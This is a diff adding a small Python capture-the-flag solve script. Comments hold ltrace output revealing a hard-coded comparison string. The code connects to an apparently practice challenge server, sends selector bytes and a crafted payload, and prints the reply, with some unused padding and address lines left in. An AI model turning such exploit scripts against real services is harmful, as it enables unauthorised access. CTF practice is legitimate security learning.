@@ -1,0 +1,54 @@
+import struct
+import pwn 
+import socket
+import time
+
+# open("./flag.txt", 0, 00)                                            = -1
+# read(-1 <no return ...>
+# error: maximum array length seems negative
+# , "\200\003", 100)                                                   = -1
+# read(0asd
+# , "asd\n", 100)                                                = 4
+# strlen("\200\003")                                                   = 2
+# strncmp("asd\n", "\200\003", 2)                                      = -31
+# printf("Your guessed wrong with "Your guessed wrong with )                                   = 24
+# printf("asd\n"asd
+
+# payload: \200\003
+
+pwn.p32(0x080491e2)
+padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
+payload = "\200\003"
+
+
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+# Connect to the server
+
+
+clientSocket.connect(("host1.metaproblems.com",5470))
+clientSocket.send("\x22".encode())
+
+time.sleep(1)
+
+
+clientSocket.send("\x06".encode())
+
+# Send data to server
+time.sleep(1)
+
+clientSocket.send(payload.encode())
+
+ 
+
+# Receive data from server
+
+dataFromServer = clientSocket.recv(4096)
+
+ 
+
+# Print to the console
+
+print(dataFromServer.decode())
